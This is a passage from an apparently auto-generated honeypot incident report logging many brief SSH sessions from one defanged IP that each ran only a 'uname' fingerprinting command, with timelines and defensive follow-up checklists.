- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0ef6907150c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:35 |
| **Last Seen** | 2026-07-19 10:36 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:35:50` | `cowrie.session.connect` |
| `2026-07-19 10:35:53` | `cowrie.client.version` |
| `2026-07-19 10:35:53` | `cowrie.client.kex` |
| `2026-07-19 10:36:02` | `cowrie.login.success` |
| `2026-07-19 10:36:08` | `cowrie.session.params` |
| `2026-07-19 10:36:08` | `cowrie.command.input` |
| `2026-07-19 10:36:11` | `cowrie.log.closed` |
| `2026-07-19 10:36:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84d3b26dc623

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:36 |
| **Last Seen** | 2026-07-19 10:36 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:36:04` | `cowrie.session.connect` |
| `2026-07-19 10:36:06` | `cowrie.client.version` |
| `2026-07-19 10:36:06` | `cowrie.client.kex` |
| `2026-07-19 10:36:20` | `cowrie.login.success` |
| `2026-07-19 10:36:27` | `cowrie.session.params` |
| `2026-07-19 10:36:27` | `cowrie.command.input` |
| `2026-07-19 10:36:30` | `cowrie.log.closed` |
| `2026-07-19 10:36:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df3686d82171

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:36 |
| **Last Seen** | 2026-07-19 10:36 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:36:16` | `cowrie.session.connect` |
| `2026-07-19 10:36:19` | `cowrie.client.version` |
| `2026-07-19 10:36:19` | `cowrie.client.kex` |
| `2026-07-19 10:36:31` | `cowrie.login.success` |
| `2026-07-19 10:36:35` | `cowrie.session.params` |
| `2026-07-19 10:36:35` | `cowrie.command.input` |
| `2026-07-19 10:36:37` | `cowrie.log.closed` |
| `2026-07-19 10:36:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80ce6306c74e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:36 |
| **Last Seen** | 2026-07-19 10:36 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:36:33` | `cowrie.session.connect` |
| `2026-07-19 10:36:34` | `cowrie.client.version` |
| `2026-07-19 10:36:34` | `cowrie.client.kex` |
| `2026-07-19 10:36:44` | `cowrie.login.success` |
| `2026-07-19 10:36:49` | `cowrie.session.params` |
| `2026-07-19 10:36:49` | `cowrie.command.input` |
| `2026-07-19 10:36:51` | `cowrie.log.closed` |
| `2026-07-19 10:36:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67ac7c13b5db

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:36 |
| **Last Seen** | 2026-07-19 10:37 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:36:46` | `cowrie.session.connect` |
| `2026-07-19 10:36:48` | `cowrie.client.version` |
| `2026-07-19 10:36:48` | `cowrie.client.kex` |
| `2026-07-19 10:36:58` | `cowrie.login.success` |
| `2026-07-19 10:37:05` | `cowrie.session.params` |
| `2026-07-19 10:37:05` | `cowrie.command.input` |
| `2026-07-19 10:37:07` | `cowrie.log.closed` |
| `2026-07-19 10:37:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8bc25d3edc0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:36 |
| **Last Seen** | 2026-07-19 10:37 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:36:56` | `cowrie.session.connect` |
| `2026-07-19 10:36:58` | `cowrie.client.version` |
| `2026-07-19 10:36:58` | `cowrie.client.kex` |
| `2026-07-19 10:37:09` | `cowrie.login.success` |
| `2026-07-19 10:37:14` | `cowrie.session.params` |
| `2026-07-19 10:37:14` | `cowrie.command.input` |
| `2026-07-19 10:37:18` | `cowrie.log.closed` |
| `2026-07-19 10:37:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3a4ad9207d0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:37 |
| **Last Seen** | 2026-07-19 10:37 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:37:09` | `cowrie.session.connect` |
| `2026-07-19 10:37:11` | `cowrie.client.version` |
| `2026-07-19 10:37:11` | `cowrie.client.kex` |
| `2026-07-19 10:37:22` | `cowrie.login.success` |
| `2026-07-19 10:37:26` | `cowrie.session.params` |
| `2026-07-19 10:37:26` | `cowrie.command.input` |
| `2026-07-19 10:37:27` | `cowrie.log.closed` |
| `2026-07-19 10:37:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-664207e81813

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:37 |
| **Last Seen** | 2026-07-19 10:37 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:37:27` | `cowrie.session.connect` |
| `2026-07-19 10:37:28` | `cowrie.client.version` |
| `2026-07-19 10:37:28` | `cowrie.client.kex` |
| `2026-07-19 10:37:33` | `cowrie.login.success` |
| `2026-07-19 10:37:36` | `cowrie.session.params` |
| `2026-07-19 10:37:36` | `cowrie.command.input` |
| `2026-07-19 10:37:39` | `cowrie.log.closed` |
| `2026-07-19 10:37:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-978bcee57180

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:37 |
| **Last Seen** | 2026-07-19 10:37 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:37:41` | `cowrie.session.connect` |
| `2026-07-19 10:37:41` | `cowrie.client.version` |
| `2026-07-19 10:37:41` | `cowrie.client.kex` |
| `2026-07-19 10:37:48` | `cowrie.login.success` |
| `2026-07-19 10:37:52` | `cowrie.session.params` |
| `2026-07-19 10:37:52` | `cowrie.command.input` |
| `2026-07-19 10:37:53` | `cowrie.log.closed` |
| `2026-07-19 10:37:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2108faf635d7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:37 |
| **Last Seen** | 2026-07-19 10:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:37:53` | `cowrie.session.connect` |
| `2026-07-19 10:37:54` | `cowrie.client.version` |
| `2026-07-19 10:37:54` | `cowrie.client.kex` |
| `2026-07-19 10:38:00` | `cowrie.login.success` |
| `2026-07-19 10:38:02` | `cowrie.session.params` |
| `2026-07-19 10:38:02` | `cowrie.command.input` |
| `2026-07-19 10:38:03` | `cowrie.log.closed` |
| `2026-07-19 10:38:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18304bbbff95

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:38 |
| **Last Seen** | 2026-07-19 10:38 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:38:06` | `cowrie.session.connect` |
| `2026-07-19 10:38:08` | `cowrie.client.version` |
| `2026-07-19 10:38:08` | `cowrie.client.kex` |
| `2026-07-19 10:38:12` | `cowrie.login.success` |
| `2026-07-19 10:38:16` | `cowrie.session.params` |
| `2026-07-19 10:38:16` | `cowrie.command.input` |
| `2026-07-19 10:38:17` | `cowrie.log.closed` |
| `2026-07-19 10:38:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-414d4091c9d4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:38 |
| **Last Seen** | 2026-07-19 10:38 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:38:19` | `cowrie.session.connect` |
| `2026-07-19 10:38:21` | `cowrie.client.version` |
| `2026-07-19 10:38:21` | `cowrie.client.kex` |
| `2026-07-19 10:38:27` | `cowrie.login.success` |
| `2026-07-19 10:38:32` | `cowrie.session.params` |
| `2026-07-19 10:38:32` | `cowrie.command.input` |
| `2026-07-19 10:38:33` | `cowrie.log.closed` |
| `2026-07-19 10:38:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb5c860c684b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:38 |
| **Last Seen** | 2026-07-19 10:38 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:38:33` | `cowrie.session.connect` |
| `2026-07-19 10:38:34` | `cowrie.client.version` |
| `2026-07-19 10:38:34` | `cowrie.client.kex` |
| `2026-07-19 10:38:44` | `cowrie.login.success` |
| `2026-07-19 10:38:48` | `cowrie.session.params` |
| `2026-07-19 10:38:48` | `cowrie.command.input` |
| `2026-07-19 10:38:51` | `cowrie.log.closed` |
| `2026-07-19 10:38:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-07725b63e97f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:38 |
| **Last Seen** | 2026-07-19 10:39 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:38:46` | `cowrie.session.connect` |
| `2026-07-19 10:38:48` | `cowrie.client.version` |
| `2026-07-19 10:38:48` | `cowrie.client.kex` |
| `2026-07-19 10:39:00` | `cowrie.login.success` |
| `2026-07-19 10:39:05` | `cowrie.session.params` |
| `2026-07-19 10:39:05` | `cowrie.command.input` |
| `2026-07-19 10:39:09` | `cowrie.log.closed` |
| `2026-07-19 10:39:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a96406abb35

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:38 |
| **Last Seen** | 2026-07-19 10:39 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:38:58` | `cowrie.session.connect` |
| `2026-07-19 10:39:00` | `cowrie.client.version` |
| `2026-07-19 10:39:00` | `cowrie.client.kex` |
| `2026-07-19 10:39:11` | `cowrie.login.success` |
| `2026-07-19 10:39:15` | `cowrie.session.params` |
| `2026-07-19 10:39:15` | `cowrie.command.input` |
| `2026-07-19 10:39:17` | `cowrie.log.closed` |
| `2026-07-19 10:39:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f6b9c2f75b18

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:39 |
| **Last Seen** | 2026-07-19 10:39 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:39:13` | `cowrie.session.connect` |
| `2026-07-19 10:39:14` | `cowrie.client.version` |
| `2026-07-19 10:39:14` | `cowrie.client.kex` |
| `2026-07-19 10:39:19` | `cowrie.login.success` |
| `2026-07-19 10:39:22` | `cowrie.session.params` |
| `2026-07-19 10:39:22` | `cowrie.command.input` |
| `2026-07-19 10:39:23` | `cowrie.log.closed` |
| `2026-07-19 10:39:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3aa1cd1e002

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:39 |
| **Last Seen** | 2026-07-19 10:39 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:39:25` | `cowrie.session.connect` |
| `2026-07-19 10:39:27` | `cowrie.client.version` |
| `2026-07-19 10:39:27` | `cowrie.client.kex` |
| `2026-07-19 10:39:33` | `cowrie.login.success` |
| `2026-07-19 10:39:38` | `cowrie.session.params` |
| `2026-07-19 10:39:38` | `cowrie.command.input` |
| `2026-07-19 10:39:40` | `cowrie.log.closed` |
| `2026-07-19 10:39:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c6a4a0520b88

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:39 |
| **Last Seen** | 2026-07-19 10:39 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:39:37` | `cowrie.session.connect` |
| `2026-07-19 10:39:39` | `cowrie.client.version` |
| `2026-07-19 10:39:39` | `cowrie.client.kex` |
| `2026-07-19 10:39:47` | `cowrie.login.success` |
| `2026-07-19 10:39:52` | `cowrie.session.params` |
| `2026-07-19 10:39:52` | `cowrie.command.input` |
| `2026-07-19 10:39:53` | `cowrie.log.closed` |
| `2026-07-19 10:39:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea96f22dd089

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:39 |
| **Last Seen** | 2026-07-19 10:40 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:39:52` | `cowrie.session.connect` |
| `2026-07-19 10:39:54` | `cowrie.client.version` |
| `2026-07-19 10:39:54` | `cowrie.client.kex` |
| `2026-07-19 10:40:01` | `cowrie.login.success` |
| `2026-07-19 10:40:06` | `cowrie.session.params` |
| `2026-07-19 10:40:06` | `cowrie.command.input` |
| `2026-07-19 10:40:11` | `cowrie.log.closed` |
| `2026-07-19 10:40:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2839e2a3d88d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:40 |
| **Last Seen** | 2026-07-19 10:40 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:40:00` | `cowrie.session.connect` |
| `2026-07-19 10:40:03` | `cowrie.client.version` |
| `2026-07-19 10:40:03` | `cowrie.client.kex` |
| `2026-07-19 10:40:14` | `cowrie.login.success` |
| `2026-07-19 10:40:19` | `cowrie.session.params` |
| `2026-07-19 10:40:19` | `cowrie.command.input` |
| `2026-07-19 10:40:23` | `cowrie.log.closed` |
| `2026-07-19 10:40:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-955f000c89d5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:40 |
| **Last Seen** | 2026-07-19 10:40 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:40:14` | `cowrie.session.connect` |
| `2026-07-19 10:40:17` | `cowrie.client.version` |
| `2026-07-19 10:40:17` | `cowrie.client.kex` |
| `2026-07-19 10:40:33` | `cowrie.login.success` |
| `2026-07-19 10:40:39` | `cowrie.session.params` |
| `2026-07-19 10:40:39` | `cowrie.command.input` |
| `2026-07-19 10:40:41` | `cowrie.log.closed` |
| `2026-07-19 10:40:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fc888142a12

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:40 |
| **Last Seen** | 2026-07-19 10:40 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:40:27` | `cowrie.session.connect` |
| `2026-07-19 10:40:29` | `cowrie.client.version` |
| `2026-07-19 10:40:29` | `cowrie.client.kex` |
| `2026-07-19 10:40:41` | `cowrie.login.success` |
| `2026-07-19 10:40:48` | `cowrie.session.params` |
| `2026-07-19 10:40:48` | `cowrie.command.input` |
| `2026-07-19 10:40:51` | `cowrie.log.closed` |
| `2026-07-19 10:40:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fd583c46f1a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:40 |
| **Last Seen** | 2026-07-19 10:41 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:40:41` | `cowrie.session.connect` |
| `2026-07-19 10:40:43` | `cowrie.client.version` |
| `2026-07-19 10:40:43` | `cowrie.client.kex` |
| `2026-07-19 10:40:56` | `cowrie.login.success` |
| `2026-07-19 10:41:02` | `cowrie.session.params` |
| `2026-07-19 10:41:02` | `cowrie.command.input` |
| `2026-07-19 10:41:06` | `cowrie.log.closed` |
| `2026-07-19 10:41:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-726e229be341

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:40 |
| **Last Seen** | 2026-07-19 10:41 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:40:52` | `cowrie.session.connect` |
| `2026-07-19 10:40:56` | `cowrie.client.version` |
| `2026-07-19 10:40:56` | `cowrie.client.kex` |
| `2026-07-19 10:41:09` | `cowrie.login.success` |
| `2026-07-19 10:41:19` | `cowrie.session.params` |
| `2026-07-19 10:41:19` | `cowrie.command.input` |
| `2026-07-19 10:41:22` | `cowrie.log.closed` |
| `2026-07-19 10:41:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-341413c5ef29

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:41 |
| **Last Seen** | 2026-07-19 10:41 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:41:04` | `cowrie.session.connect` |
| `2026-07-19 10:41:09` | `cowrie.client.version` |
| `2026-07-19 10:41:09` | `cowrie.client.kex` |
| `2026-07-19 10:41:27` | `cowrie.login.success` |
| `2026-07-19 10:41:35` | `cowrie.session.params` |
| `2026-07-19 10:41:35` | `cowrie.command.input` |
| `2026-07-19 10:41:37` | `cowrie.log.closed` |
| `2026-07-19 10:41:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5762b2b9e84

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 10:41 |
| **Last Seen** | 2026-07-19 10:41 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 10:41:15` | `cowrie.session.connect` |
| `2026-07-19 10:41:20` | `cowrie.client.version` |
| `2026-07-19 10:41:20` | `cowrie.client.kex` |
| `2026-07-19 10:41:33` | `cowrie.login.success` |
